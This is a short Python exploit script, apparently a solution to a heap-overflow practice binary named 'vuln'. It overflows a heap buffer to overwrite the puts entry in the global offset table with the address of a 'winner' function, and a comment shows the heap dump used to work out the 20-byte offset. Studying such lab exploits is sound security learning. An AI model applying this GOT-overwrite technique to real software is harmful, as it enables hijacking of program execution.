# exploit.py created 10/06/2022
import os
import struct
target_addr = 0x804c01c # puts@got.plt (puts global offset table)
source_addr = 0x80491a2 # winner

arg1 = "AAAABBBBCCCCDDDDEEEE" + struct.pack("I", target_addr)
arg2 = struct.pack("I", source_addr)

os.system("./vuln " + arg1 + " " +arg2)

"""
The heap :
0x804d198:	0x00000000	0x00000011	0x00000001	0x0804d1b0
0x804d1a8:	0x00000000	0x00000011	0x41414141	0x00000000
0x804d1b8:	0x00000000	0x00000011	0x00000002	0x0804d1d0
0x804d1c8:	0x00000000	0x00000011	0x00000000	0x00000000
From the address 0x804d1a8+8 (where there are 0x41414141) i counted how much bytes i have to write before overwriting the 0x804d1b8+12 pointer
So it's 5*4 bytes and it corresponds to the "AAAABBBBCCCCDDDDEEEE"
"""
